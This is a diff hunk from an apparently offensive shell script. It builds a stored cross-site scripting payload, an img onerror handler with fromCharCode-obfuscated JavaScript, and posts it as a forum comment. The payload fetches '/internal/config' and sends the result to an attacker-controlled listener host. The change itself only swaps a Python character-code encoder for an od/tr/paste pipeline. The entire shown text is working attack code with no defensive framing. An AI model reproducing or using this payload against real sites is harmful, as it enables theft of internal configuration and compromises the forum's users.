@@ -15,12 +15,7 @@ THREAD="${4:-bbeo32ucx0a65b8}"
 JS="var C='http://${LISTENER}/config?d=';fetch('/internal/config').then(r=>r.text()).then(t=>{new Image().src=C+encodeURIComponent(t)})"
 
 # Encode JS as fromCharCode() digits so the attribute needs no inner quotes.
-CODES=$(python3 - "$JS" <<'PY'
-import sys
-js = sys.argv[1]
-print(','.join(str(ord(c)) for c in js))
-PY
-)
+CODES=$(printf '%s' "$JS" | od -An -td1 | tr -s ' ' '\n' | sed '/^$/d' | paste -sd, -)
 PAYLOAD="<img src=x onerror=\"eval(String.fromCharCode(${CODES}))\">"
 
 echo "[*] Posting SSRF-relay payload to $BASE/forum/$THREAD/comment"
